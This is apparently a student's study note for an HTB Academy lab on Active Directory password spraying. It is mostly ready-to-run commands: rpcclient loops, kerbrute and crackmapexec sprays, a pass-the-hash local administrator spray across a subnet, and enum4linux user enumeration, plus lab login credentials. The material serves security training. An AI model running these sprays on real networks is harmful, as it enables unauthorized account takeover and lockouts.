

>[!Note]
> Create your username list and then execute the below attacks with rpcclient, kerbrute, bash, crackmapexec

>[!Tip] Tip about rpcclient!
> A valid login is not immediately apparent with `rpcclient`, with the response `Authority Name` indicating a successful login

##### Bash
```go
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

##### Kerbrute
```go
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

##### CrackMapExec and Filtering Logon Failures

*Uses a password file and greps "+" to filter out login failures*
```go
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

Validating Founds Creds with CrackMapExec
```go
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

##### Local Admin Spraying with CrackMapExec
>[!Info] 
> - The command below attempts to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. 
> - The flag `--local-auth` attempts to log in one time on each machine removing any risk of account lockout. Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain.

```go
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

# Questions

Username
```go
htb-student
```

Password
```go
HTB_@cademy_stdnt!
```

SSH
```go
sshpass -p "HTB_@cademy_stdnt!" ssh htb-student@10.129.36.104
```

Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.

First step is create a list of valid users
```go
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > users.txt
```

Then use the `users.txt` list for the password spray
```go
for u in $(cat users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

